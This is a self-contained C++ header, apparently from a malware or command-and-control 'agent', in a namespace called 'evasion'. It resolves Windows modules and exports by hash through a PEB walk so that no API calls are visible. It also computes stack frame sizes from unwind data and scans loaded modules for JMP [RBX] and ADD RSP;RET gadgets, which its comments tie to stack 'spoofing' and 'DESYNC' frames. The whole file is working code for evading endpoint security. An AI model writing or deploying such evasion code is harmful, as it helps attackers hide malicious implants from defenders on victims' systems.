// __NAME__ Agent — PEB Walk, PE Export Parser, UNWIND_INFO, Gadget Scanners
//
// Self-contained header-only implementation. Zero Win32 API calls.
// All module/function resolution via PEB walk + hash comparison.

#pragma once

#ifdef _WIN32
#include <winsock2.h>
#endif
#include <windows.h>
#include <stdint.h>
#include <string.h>

#include "hash.h"

// UNICODE_STRING is defined in winternl.h but including it conflicts with other
// MinGW headers. Define it locally if not already available.
#ifndef _WINTERNL_
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
#endif

namespace evasion {

// ─── PE structures (self-contained, no winnt.h dependency for internals) ───

struct PEB_LDR_DATA_FULL {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
};

struct LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
};

// RUNTIME_FUNCTION for .pdata
struct RT_FUNCTION {
    uint32_t BeginAddress;
    uint32_t EndAddress;
    uint32_t UnwindData;
};

// UNWIND_INFO header
struct UNWIND_INFO_HDR {
    uint8_t VersionAndFlags;
    uint8_t SizeOfProlog;
    uint8_t CountOfCodes;
    uint8_t FrameRegisterAndOffset;
};

// UNWIND_CODE entry (2 bytes)
struct UNWIND_CODE_ENTRY {
    uint8_t CodeOffset;
    uint8_t OpAndInfo;

    uint8_t UnwindOp() const { return OpAndInfo & 0x0F; }
    uint8_t OpInfo()   const { return (OpAndInfo >> 4) & 0x0F; }
};

// UNWIND_CODE operation codes
constexpr uint8_t UWOP_PUSH_NONVOL     = 0;
constexpr uint8_t UWOP_ALLOC_LARGE     = 1;
constexpr uint8_t UWOP_ALLOC_SMALL     = 2;
constexpr uint8_t UWOP_SET_FPREG       = 3;
constexpr uint8_t UWOP_SAVE_NONVOL     = 4;
constexpr uint8_t UWOP_SAVE_NONVOL_FAR = 5;
constexpr uint8_t UWOP_SAVE_XMM128     = 8;
constexpr uint8_t UWOP_SAVE_XMM128_FAR = 9;
constexpr uint8_t UWOP_PUSH_MACHFRAME  = 10;

// Use _EV suffix to avoid collision with winnt.h macro
constexpr uint8_t UNW_FLAG_CHAININFO_EV = 0x04;

// Frame size safety limits
constexpr uintptr_t MIN_JMP_RBX_FRAME_SIZE = 0xD8;
constexpr uintptr_t MIN_ADD_RSP_X          = 0xB0;

// IMAGE_DIRECTORY_ENTRY constants
constexpr uint32_t DIR_EXPORT    = 0;
constexpr uint32_t DIR_EXCEPTION = 3;

// ─── Export entry ───

struct ExportEntry {
    uint32_t nameHash;
    uintptr_t virtualAddress;
};

// ─── Gadget search results ───

struct FrameSearchResult {
    uintptr_t funcAddr;
    uintptr_t frameSize;
    uintptr_t rbpOffset;
    uintptr_t callOffset;
};

// ─── PEB Walk ─────────────────────────────────────────────────────────────

// readGS60 — defined in syscall.S (assembly). Reads GS:[0x60] = PEB pointer.
extern "C" uintptr_t readGS60();
extern "C" uintptr_t readGS30();

// Find a loaded module by DJB2 hash of its BaseDllName (case-insensitive).
// Returns the module base address, 0 if not found.
inline uintptr_t findModuleByHash(uint32_t nameHash) {
    uintptr_t peb = readGS60();
    if (!peb) return 0;

    auto* ldr = *reinterpret_cast<PEB_LDR_DATA_FULL**>(peb + 0x18);
    if (!ldr) return 0;

    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur  = head->Flink;

    while (cur != head) {
        // cur points to InMemoryOrderLinks field inside LDR_DATA_TABLE_ENTRY
        auto* entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);

        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            // Hash the BaseDllName (UTF-16 → lowercase DJB2)
            uint32_t h = 5381;
            int len = entry->BaseDllName.Length / 2;
            for (int i = 0; i < len; i++) {
                char c = static_cast<char>(entry->BaseDllName.Buffer[i]);
                if (c >= 'A' && c <= 'Z') c += ('a' - 'A');
                h = ((h << 5) + h) + static_cast<uint32_t>(c);
            }
            if (h == nameHash) {
                return reinterpret_cast<uintptr_t>(entry->DllBase);
            }
        }

        cur = cur->Flink;
    }
    return 0;
}

// Get PEB.ImageBaseAddress (host .exe base for Process Image Frames)
inline uintptr_t getProcessImageBase() {
    uintptr_t peb = readGS60();
    if (!peb) return 0;
    return *reinterpret_cast<uintptr_t*>(peb + 0x10); // PEB.ImageBaseAddress
}

// ─── PE Export Table Parser ───────────────────────────────────────────────

inline bool validateDosNt(uintptr_t base, IMAGE_DOS_HEADER** dos, IMAGE_NT_HEADERS** nt) {
    *dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if ((*dos)->e_magic != 0x5A4D || (*dos)->e_lfanew <= 0)
        return false;
    *nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + (*dos)->e_lfanew);
    if ((*nt)->Signature != 0x00004550)
        return false;
    return true;
}

// Enumerate all exports from a module. Caller provides buffer and max count.
// Returns actual number of exports filled.
inline int getExports(uintptr_t moduleBase, ExportEntry* out, int maxExports) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return 0;

    auto& expDir = nt->OptionalHeader.DataDirectory[DIR_EXPORT];
    if (expDir.VirtualAddress == 0 || expDir.Size == 0)
        return 0;

    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(moduleBase + expDir.VirtualAddress);
    auto* names    = reinterpret_cast<uint32_t*>(moduleBase + exp->AddressOfNames);
    auto* funcs    = reinterpret_cast<uint32_t*>(moduleBase + exp->AddressOfFunctions);
    auto* ordinals = reinterpret_cast<uint16_t*>(moduleBase + exp->AddressOfNameOrdinals);

    int count = 0;
    uint32_t numNames = exp->NumberOfNames;
    for (uint32_t i = 0; i < numNames && count < maxExports; i++) {
        auto* name = reinterpret_cast<const char*>(moduleBase + names[i]);
        uintptr_t funcAddr = moduleBase + funcs[ordinals[i]];

        out[count].nameHash = djb2HashRuntime(name);
        out[count].virtualAddress = funcAddr;
        count++;
    }
    return count;
}

// ─── API Set Resolution ──────────────────────────────────────────────────

// Check if a DLL name (ASCII) is an API Set (starts with "api-" or "ext-").
inline bool isApiSet(const char* name, int len) {
    if (len < 4) return false;
    char a = name[0] | 0x20, b = name[1] | 0x20, c = name[2] | 0x20, d = name[3];
    return (a == 'a' && b == 'p' && c == 'i' && d == '-')
        || (a == 'e' && b == 'x' && c == 't' && d == '-');
}

// Resolve an API Set name to the host module base address via PEB ApiSetMap.
// `name` is the DLL part of a forwarded export (e.g., "api-ms-win-core-heap-l1-1-0").
// Returns 0 if resolution fails.
inline uintptr_t resolveApiSet(const char* name, int nameLen) {
    uintptr_t peb = readGS60();
    if (!peb) return 0;

    // PEB+0x68 = ApiSetMap pointer (x64)
    uintptr_t apiSetMap = *reinterpret_cast<uintptr_t*>(peb + 0x68);
    if (!apiSetMap) return 0;

    // API_SET_NAMESPACE header: Version(4), Size(4), Flags(4), Count(4),
    //   EntryOffset(4), HashOffset(4), HashFactor(4) — 28 bytes
    uint32_t version = *reinterpret_cast<uint32_t*>(apiSetMap);
    if (version < 2) return 0;

    uint32_t count       = *reinterpret_cast<uint32_t*>(apiSetMap + 12);
    if (count == 0) return 0;

    uint32_t entryOffset = *reinterpret_cast<uint32_t*>(apiSetMap + 16);
    uint32_t hashOffset  = *reinterpret_cast<uint32_t*>(apiSetMap + 20);
    uint32_t hashFactor  = *reinterpret_cast<uint32_t*>(apiSetMap + 24);

    // Lowercase the name
    char lower[128];
    int len = (nameLen < 128) ? nameLen : 127;
    for (int i = 0; i < len; i++)
        lower[i] = (name[i] >= 'A' && name[i] <= 'Z') ? name[i] + 32 : name[i];

    // Find last hyphen → hash only the portion up to (not including) it
    int lastHyphen = -1;
    for (int i = 0; i < len; i++)
        if (lower[i] == '-') lastHyphen = i;
    if (lastHyphen <= 0) return 0;

    // Compute hash using namespace.HashFactor
    uint32_t hashKey = 0;
    for (int i = 0; i < lastHyphen; i++)
        hashKey = hashKey * hashFactor + static_cast<uint32_t>(static_cast<uint8_t>(lower[i]));

    // Binary search the API_SET_HASH_ENTRY table
    // Each entry: Hash(u32) + Index(u32) = 8 bytes
    int lo = 0, hi = static_cast<int>(count) - 1;
    int foundIndex = -1;

    while (lo <= hi) {
        int mid = (lo + hi) / 2;
        uintptr_t he = apiSetMap + hashOffset + static_cast<uintptr_t>(mid) * 8;
        uint32_t heHash = *reinterpret_cast<uint32_t*>(he);

        if (hashKey < heHash) {
            hi = mid - 1;
        } else if (hashKey > heHash) {
            lo = mid + 1;
        } else {
            // Hash match — verify against the namespace entry name (UTF-16)
            uint32_t idx = *reinterpret_cast<uint32_t*>(he + 4);
            // API_SET_NAMESPACE_ENTRY: 24 bytes
            uintptr_t nse = apiSetMap + entryOffset + static_cast<uintptr_t>(idx) * 24;
            uint32_t nseNameOff   = *reinterpret_cast<uint32_t*>(nse + 4);
            uint32_t nseHashedLen = *reinterpret_cast<uint32_t*>(nse + 12); // bytes, UTF-16
            int nseChars = static_cast<int>(nseHashedLen / 2);
            auto* nseName = reinterpret_cast<uint16_t*>(apiSetMap + nseNameOff);

            bool ok = (nseChars == lastHyphen);
            if (ok) {
                for (int i = 0; i < nseChars; i++) {
                    char c = static_cast<char>(nseName[i] & 0xFF);
                    if (c >= 'A' && c <= 'Z') c += 32;
                    if (c != lower[i]) { ok = false; break; }
                }
            }
            if (ok) foundIndex = static_cast<int>(idx);
            break;
        }
    }

    if (foundIndex < 0) return 0;

    // Read the value entry for the resolved namespace entry
    uintptr_t nse = apiSetMap + entryOffset + static_cast<uintptr_t>(foundIndex) * 24;
    uint32_t valOffset = *reinterpret_cast<uint32_t*>(nse + 16);
    uint32_t valCount  = *reinterpret_cast<uint32_t*>(nse + 20);
    if (valCount == 0) return 0;

    // API_SET_VALUE_ENTRY: 20 bytes — use last (default) value entry.
    // Entry[0] may be a per-DLL override (e.g. kernel32→kernel32) that
    // causes circular resolution when following forwarded exports.
    uintptr_t ve = apiSetMap + valOffset + static_cast<uintptr_t>(valCount - 1) * 20;
    uint32_t hostOff = *reinterpret_cast<uint32_t*>(ve + 12);
    uint32_t hostLen = *reinterpret_cast<uint32_t*>(ve + 16); // bytes, UTF-16
    if (hostLen == 0) return 0;

    // Hash the host DLL name (UTF-16, already includes ".dll") with DJB2
    auto* hostName = reinterpret_cast<uint16_t*>(apiSetMap + hostOff);
    int hostChars = static_cast<int>(hostLen / 2);
    uint32_t dllHash = 5381;
    for (int i = 0; i < hostChars; i++) {
        char c = static_cast<char>(hostName[i] & 0xFF);
        if (c >= 'A' && c <= 'Z') c += 32;
        dllHash = ((dllHash << 5) + dllHash) + static_cast<uint32_t>(static_cast<uint8_t>(c));
    }

    return findModuleByHash(dllHash);
}

// Resolve a single export by DJB2 hash from a module. Returns 0 if not found.
// Handles forwarded exports (RVA points inside export directory → forwarding string).
inline uintptr_t resolveExportByHash(uintptr_t moduleBase, uint32_t funcHash) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return 0;

    auto& expDir = nt->OptionalHeader.DataDirectory[DIR_EXPORT];
    if (expDir.VirtualAddress == 0 || expDir.Size == 0)
        return 0;

    uintptr_t exportDirStart = expDir.VirtualAddress;
    uintptr_t exportDirEnd   = exportDirStart + expDir.Size;

    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(moduleBase + expDir.VirtualAddress);
    auto* names    = reinterpret_cast<uint32_t*>(moduleBase + exp->AddressOfNames);
    auto* funcs    = reinterpret_cast<uint32_t*>(moduleBase + exp->AddressOfFunctions);
    auto* ordinals = reinterpret_cast<uint16_t*>(moduleBase + exp->AddressOfNameOrdinals);

    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        auto* name = reinterpret_cast<const char*>(moduleBase + names[i]);
        if (djb2HashRuntime(name) != funcHash)
            continue;

        uint32_t funcRVA = funcs[ordinals[i]];

        // Forwarded export: RVA falls within export directory → ASCII string
        // e.g. "KERNELBASE.GetProcessMitigationPolicy"
        if (funcRVA >= exportDirStart && funcRVA < exportDirEnd) {
            auto* fwdStr = reinterpret_cast<const char*>(moduleBase + funcRVA);
            // Find the '.' separator
            int dotIdx = -1;
            for (int j = 0; fwdStr[j] != '\0' && j < 256; j++) {
                if (fwdStr[j] == '.') { dotIdx = j; break; }
            }
            if (dotIdx <= 0) return 0;

            // Hash the forwarded function name
            uint32_t fwdFuncHash = djb2HashRuntime(fwdStr + dotIdx + 1);

            // Check if the DLL name is an API Set → resolve via PEB ApiSetMap
            uintptr_t targetBase = 0;
            if (isApiSet(fwdStr, dotIdx)) {
                targetBase = resolveApiSet(fwdStr, dotIdx);
            } else {
                // Hash the DLL name (+ ".dll") case-insensitive DJB2
                uint32_t dllHash = 5381;
                for (int j = 0; j < dotIdx; j++) {
                    char c = fwdStr[j];
                    if (c >= 'A' && c <= 'Z') c += ('a' - 'A');
                    dllHash = ((dllHash << 5) + dllHash) + static_cast<uint32_t>(c);
                }
                const char* suffix = ".dll";
                for (int j = 0; suffix[j]; j++)
                    dllHash = ((dllHash << 5) + dllHash) + static_cast<uint32_t>(suffix[j]);
                targetBase = findModuleByHash(dllHash);
            }

            if (targetBase == 0) return 0;
            return resolveExportByHash(targetBase, fwdFuncHash);
        }

        return moduleBase + funcRVA;
    }
    return 0;
}

// ─── .text Section Locator ────────────────────────────────────────────────

inline bool findTextSection(uintptr_t moduleBase, uintptr_t* start, uintptr_t* size) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return false;

    uintptr_t sectionOffset = reinterpret_cast<uintptr_t>(nt) + 4 +
        sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader;

    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        auto* sec = reinterpret_cast<IMAGE_SECTION_HEADER*>(sectionOffset + i * 40);
        if (sec->Name[0] == '.' && sec->Name[1] == 't' && sec->Name[2] == 'e' &&
            sec->Name[3] == 'x' && sec->Name[4] == 't') {
            *start = moduleBase + sec->VirtualAddress;
            *size  = sec->SizeOfRawData;
            return true;
        }
    }
    return false;
}

// ─── .pdata Binary Search ─────────────────────────────────────────────────

inline RT_FUNCTION* lookupRuntimeFunction(uintptr_t moduleBase, uintptr_t addr) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return nullptr;

    auto& excDir = nt->OptionalHeader.DataDirectory[DIR_EXCEPTION];
    if (excDir.VirtualAddress == 0 || excDir.Size == 0)
        return nullptr;

    uint32_t rva = static_cast<uint32_t>(addr - moduleBase);
    auto* tableBase = reinterpret_cast<RT_FUNCTION*>(moduleBase + excDir.VirtualAddress);
    uintptr_t count = excDir.Size / sizeof(RT_FUNCTION);

    uintptr_t low = 0, high = count;
    while (low < high) {
        uintptr_t mid = (low + high) / 2;
        RT_FUNCTION* entry = &tableBase[mid];
        if (rva < entry->BeginAddress)
            high = mid;
        else if (rva >= entry->EndAddress)
            low = mid + 1;
        else
            return entry;
    }
    return nullptr;
}

// ─── UNWIND_INFO Frame Size Calculator ────────────────────────────────────

inline uintptr_t calcUnwindFrameSize(uintptr_t imageBase, RT_FUNCTION* rf) {
    if (!rf) return 0;

    auto* unwind = reinterpret_cast<UNWIND_INFO_HDR*>(imageBase + rf->UnwindData);
    if ((unwind->VersionAndFlags & 0x07) != 1)
        return 0;

    uintptr_t totalSize = 0;
    bool hasSaveNonvol = false;
    uintptr_t maxSaveOff = 0;

    int codeCount = unwind->CountOfCodes;
    auto* codes = reinterpret_cast<UNWIND_CODE_ENTRY*>(
        reinterpret_cast<uintptr_t>(unwind) + 4);

    int index = 0;
    while (index < codeCount) {
        auto* code = &codes[index];
        uint8_t op   = code->UnwindOp();
        uint8_t info = code->OpInfo();

        switch (op) {
        case UWOP_PUSH_NONVOL:
            totalSize += 8;
            break;

        case UWOP_ALLOC_SMALL:
            totalSize += static_cast<uintptr_t>(info) * 8 + 8;
            break;

        case UWOP_ALLOC_LARGE: {
            index++;
            if (index >= codeCount) return 0;
            auto* nc = &codes[index];
            uintptr_t frameOff = static_cast<uintptr_t>(nc->CodeOffset) |
                                 (static_cast<uintptr_t>(nc->OpAndInfo) << 8);
            if (info == 0) {
                frameOff *= 8;
            } else {
                index++;
                if (index >= codeCount) return 0;
                auto* nc2 = &codes[index];
                uintptr_t highWord = static_cast<uintptr_t>(nc2->CodeOffset) |
                                     (static_cast<uintptr_t>(nc2->OpAndInfo) << 8);
                frameOff += highWord << 16;
            }
            totalSize += frameOff;
            break;
        }

        case UWOP_SET_FPREG:
            break;

        case UWOP_SAVE_NONVOL: {
            index++;
            if (index < codeCount) {
                auto* nc = &codes[index];
                uintptr_t saveOff = (static_cast<uintptr_t>(nc->CodeOffset) |
                                    (static_cast<uintptr_t>(nc->OpAndInfo) << 8)) * 8;
                hasSaveNonvol = true;
                if (saveOff > maxSaveOff) maxSaveOff = saveOff;
            }
            break;
        }

        case UWOP_SAVE_NONVOL_FAR: {
            if (index + 2 < codeCount) {
                auto* nc1 = &codes[index + 1];
                auto* nc2 = &codes[index + 2];
                uintptr_t low = static_cast<uintptr_t>(nc1->CodeOffset) |
                                (static_cast<uintptr_t>(nc1->OpAndInfo) << 8);
                uintptr_t high = static_cast<uintptr_t>(nc2->CodeOffset) |
                                 (static_cast<uintptr_t>(nc2->OpAndInfo) << 8);
                uintptr_t saveOff = low | (high << 16);
                hasSaveNonvol = true;
                if (saveOff > maxSaveOff) maxSaveOff = saveOff;
            }
            index += 2;
            break;
        }

        case UWOP_SAVE_XMM128:
            return 0; // XMM save = unsafe for spoofing

        case UWOP_SAVE_XMM128_FAR:
            return 0; // XMM save = unsafe for spoofing

        case UWOP_PUSH_MACHFRAME:
            totalSize += (info == 0) ? 0x28 : 0x30;
            break;
        }

        index++;
    }

    // Handle chained unwind info
    uint8_t flags = unwind->VersionAndFlags >> 3;
    if (flags & UNW_FLAG_CHAININFO_EV) {
        uintptr_t chainIndex = static_cast<uintptr_t>(codeCount);
        if (chainIndex % 2 != 0) chainIndex++;
        auto* chainRF = reinterpret_cast<RT_FUNCTION*>(
            reinterpret_cast<uintptr_t>(codes) + chainIndex * 2);
        uintptr_t chainSize = calcUnwindFrameSize(imageBase, chainRF);
        if (chainSize == 0) return 0;
        totalSize += chainSize;
    } else {
        totalSize += 8; // return address
    }

    // SAVE_NONVOL safety: reject if saves write beyond frame boundary
    if (hasSaveNonvol && maxSaveOff >= totalSize)
        return 0;

    return totalSize;
}

inline uintptr_t calculateFrameSize(uintptr_t moduleBase, uintptr_t addr) {
    auto* rf = lookupRuntimeFunction(moduleBase, addr);
    return calcUnwindFrameSize(moduleBase, rf);
}

// ─── Find CALL instruction in function (Eclipse validation) ──────────────

inline uintptr_t findCallInFunction(uintptr_t funcAddr, uintptr_t funcSize) {
    for (uintptr_t i = 0; i + 5 < funcSize; i++) {
        uint8_t b = *reinterpret_cast<uint8_t*>(funcAddr + i);
        if (b == 0xE8) {
            return i + 5; // CALL rel32 — 5 bytes, retaddr offset
        }
        if (b == 0xFF && i + 1 < funcSize) {
            uint8_t b1 = *reinterpret_cast<uint8_t*>(funcAddr + i + 1);
            if (b1 == 0x15 && i + 6 <= funcSize) {
                return i + 6; // CALL [rip+disp32] — 6 bytes
            }
        }
    }
    return 0;
}

// ─── Gadget Scanners ─────────────────────────────────────────────────────

// FindSuitableJmpRbxGadget — scan .text for JMP [RBX] (FF 23).
// If requireCallPreceded, apply Eclipse validation (E8 at addr-5).
// Deterministic: picks largest frame size.
inline bool findJmpRbxGadget(uintptr_t moduleBase, uintptr_t minFrame,
                              bool requireCallPreceded,
                              uintptr_t* outAddr, uintptr_t* outFrameSize) {
    uintptr_t textStart, textSize;
    if (!findTextSection(moduleBase, &textStart, &textSize))
        return false;

    uintptr_t bestAddr = 0, bestSize = 0;

    for (uintptr_t i = 5; i + 1 < textSize; i++) {
        uintptr_t addr = textStart + i;
        uint8_t b0 = *reinterpret_cast<uint8_t*>(addr);
        uint8_t b1 = *reinterpret_cast<uint8_t*>(addr + 1);

        if (b0 == 0xFF && b1 == 0x23) {
            if (requireCallPreceded) {
                uint8_t callByte = *reinterpret_cast<uint8_t*>(addr - 5);
                if (callByte != 0xE8) continue;
            }
            uintptr_t fs = calculateFrameSize(moduleBase, addr);
            if (fs >= minFrame && fs > bestSize) {
                bestAddr = addr;
                bestSize = fs;
            }
        }
    }

    if (bestAddr == 0) return false;
    *outAddr = bestAddr;
    *outFrameSize = bestSize;
    return true;
}

// FindAddRspXGadget — scan for ADD RSP,imm8;RET or ADD RSP,imm32;RET.
// Picks smallest sufficient X (minimizes dead space).
inline bool findAddRspXGadget(uintptr_t moduleBase, uintptr_t minX,
                               uintptr_t* outAddr, uintptr_t* outX, uintptr_t* outFrameSize) {
    if (minX < MIN_ADD_RSP_X) minX = MIN_ADD_RSP_X;

    uintptr_t textStart, textSize;
    if (!findTextSection(moduleBase, &textStart, &textSize))
        return false;

    uintptr_t bestAddr = 0, bestX = ~uintptr_t(0), bestFS = 0;

    for (uintptr_t i = 0; i + 5 < textSize; i++) {
        uintptr_t ptr = textStart + i;
        uint8_t b0 = *reinterpret_cast<uint8_t*>(ptr);
        uint8_t b1 = *reinterpret_cast<uint8_t*>(ptr + 1);
        uint8_t b2 = *reinterpret_cast<uint8_t*>(ptr + 2);

        if (b0 == 0x48 && b1 == 0x83 && b2 == 0xC4) {
            // ADD RSP, imm8; RET — 48 83 C4 XX C3
            uintptr_t imm = *reinterpret_cast<uint8_t*>(ptr + 3);
            uint8_t ret = *reinterpret_cast<uint8_t*>(ptr + 4);
            if (ret == 0xC3 && imm >= minX && imm < bestX) {
                uintptr_t fs = calculateFrameSize(moduleBase, ptr);
                if (fs > 0) {
                    bestAddr = ptr; bestX = imm; bestFS = fs;
                }
            }
        } else if (b0 == 0x48 && b1 == 0x81 && b2 == 0xC4 && i + 8 <= textSize) {
            // ADD RSP, imm32; RET — 48 81 C4 XX XX XX XX C3
            uintptr_t imm = *reinterpret_cast<uint32_t*>(ptr + 3);
            uint8_t ret = *reinterpret_cast<uint8_t*>(ptr + 7);
            if (ret == 0xC3 && imm >= minX && imm < bestX) {
                uintptr_t fs = calculateFrameSize(moduleBase, ptr);
                if (fs > 0) {
                    bestAddr = ptr; bestX = imm; bestFS = fs;
                }
            }
        }
    }

    if (bestAddr == 0) return false;
    *outAddr = bestAddr;
    *outX = bestX;
    *outFrameSize = bestFS;
    return true;
}

// FindSetFpregFrame — scan .pdata for functions with UWOP_SET_FPREG.
// FirstFrame in DESYNC — terminates the unwinder walk.
inline bool findSetFpregFrame(uintptr_t moduleBase, uintptr_t minFrameSize,
                               FrameSearchResult* out) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return false;

    auto& excDir = nt->OptionalHeader.DataDirectory[DIR_EXCEPTION];
    if (excDir.VirtualAddress == 0 || excDir.Size == 0)
        return false;

    auto* tableBase = reinterpret_cast<RT_FUNCTION*>(moduleBase + excDir.VirtualAddress);
    uintptr_t count = excDir.Size / sizeof(RT_FUNCTION);

    FrameSearchResult best = {};

    for (uintptr_t idx = 0; idx < count; idx++) {
        auto* entry = &tableBase[idx];
        auto* unwind = reinterpret_cast<UNWIND_INFO_HDR*>(moduleBase + entry->UnwindData);
        int codeCount = unwind->CountOfCodes;
        auto* codes = reinterpret_cast<UNWIND_CODE_ENTRY*>(
            reinterpret_cast<uintptr_t>(unwind) + 4);

        bool hasSetFpreg = false, hasXmm = false;
        for (int ci = 0; ci < codeCount; ci++) {
            uint8_t op = codes[ci].UnwindOp();
            if (op == UWOP_SET_FPREG) hasSetFpreg = true;
            if (op == UWOP_SAVE_XMM128 || op == UWOP_SAVE_XMM128_FAR) hasXmm = true;
            // Skip multi-slot opcodes
            switch (op) {
            case UWOP_ALLOC_LARGE:
                ci += (codes[ci].OpInfo() == 0) ? 1 : 2; break;
            case UWOP_SAVE_NONVOL:     ci++; break;
            case UWOP_SAVE_NONVOL_FAR: ci += 2; break;
            case UWOP_SAVE_XMM128:     ci++; break;
            case UWOP_SAVE_XMM128_FAR: ci += 2; break;
            }
        }

        if (!hasSetFpreg || hasXmm) continue;

        uintptr_t funcAddr = moduleBase + entry->BeginAddress;
        uintptr_t fs = calcUnwindFrameSize(moduleBase, entry);
        if (fs < minFrameSize) continue;

        uintptr_t funcSize = entry->EndAddress - entry->BeginAddress;
        uintptr_t callOff = findCallInFunction(funcAddr, funcSize);

        // Prefer candidates with CALL; then largest frame
        if (callOff != 0 && (best.callOffset == 0 || fs > best.frameSize)) {
            best = { funcAddr, fs, 0, callOff };
        } else if (best.funcAddr == 0) {
            best = { funcAddr, fs, 0, callOff };
        }
    }

    if (best.funcAddr == 0) return false;
    *out = best;
    return true;
}

// FindPushRbpFrame — scan .pdata for PUSH_NONVOL(RBP) without SET_FPREG.
// SecondFrame in DESYNC — provides the RBP chain link.
inline bool findPushRbpFrame(uintptr_t moduleBase, FrameSearchResult* out) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS*  nt;
    if (!validateDosNt(moduleBase, &dos, &nt))
        return false;

    auto& excDir = nt->OptionalHeader.DataDirectory[DIR_EXCEPTION];
    if (excDir.VirtualAddress == 0 || excDir.Size == 0)
        return false;

    auto* tableBase = reinterpret_cast<RT_FUNCTION*>(moduleBase + excDir.VirtualAddress);
    uintptr_t count = excDir.Size / sizeof(RT_FUNCTION);

    FrameSearchResult best = {};

    for (uintptr_t idx = 0; idx < count; idx++) {
        auto* entry = &tableBase[idx];
        auto* unwind = reinterpret_cast<UNWIND_INFO_HDR*>(moduleBase + entry->UnwindData);
        int codeCount = unwind->CountOfCodes;
        auto* codes = reinterpret_cast<UNWIND_CODE_ENTRY*>(
            reinterpret_cast<uintptr_t>(unwind) + 4);

        bool hasPushRbp = false, hasSetFpreg = false, hasXmm = false;
        uintptr_t rbpStackOff = 0, currentStackOff = 0;

        for (int ci = 0; ci < codeCount; ci++) {
            uint8_t op   = codes[ci].UnwindOp();
            uint8_t info = codes[ci].OpInfo();

            switch (op) {
            case UWOP_PUSH_NONVOL:
                currentStackOff += 8;
                if (info == 5) { // RBP = register 5
                    hasPushRbp = true;
                    rbpStackOff = currentStackOff;
                }
                break;
            case UWOP_ALLOC_SMALL:
                currentStackOff += static_cast<uintptr_t>(info) * 8 + 8;
                break;
            case UWOP_ALLOC_LARGE: {
                ci++;
                if (ci >= codeCount) break;
                uintptr_t frameOff = static_cast<uintptr_t>(codes[ci].CodeOffset) |
                                     (static_cast<uintptr_t>(codes[ci].OpAndInfo) << 8);
                if (info == 0) {
                    frameOff *= 8;
                } else {
                    ci++;
                    if (ci >= codeCount) break;
                    uintptr_t hw = static_cast<uintptr_t>(codes[ci].CodeOffset) |
                                   (static_cast<uintptr_t>(codes[ci].OpAndInfo) << 8);
                    frameOff += hw << 16;
                }
                currentStackOff += frameOff;
                break;
            }
            case UWOP_SET_FPREG:     hasSetFpreg = true; break;
            case UWOP_SAVE_NONVOL:   ci++; break;
            case UWOP_SAVE_NONVOL_FAR: ci += 2; break;
            case UWOP_SAVE_XMM128:   hasXmm = true; ci++; break;
            case UWOP_SAVE_XMM128_FAR: hasXmm = true; ci += 2; break;
            }
        }

        if (!hasPushRbp || hasSetFpreg || hasXmm) continue;

        uintptr_t funcAddr = moduleBase + entry->BeginAddress;
        uintptr_t fs = calcUnwindFrameSize(moduleBase, entry);
        if (fs == 0) continue;

        uintptr_t funcSize = entry->EndAddress - entry->BeginAddress;
        uintptr_t callOff = findCallInFunction(funcAddr, funcSize);

        if (callOff != 0 && (best.callOffset == 0 || fs > best.frameSize)) {
            best = { funcAddr, fs, rbpStackOff, callOff };
        } else if (best.funcAddr == 0) {
            best = { funcAddr, fs, rbpStackOff, callOff };
        }
    }

    if (best.funcAddr == 0) return false;
    *out = best;
    return true;
}

} // namespace evasion
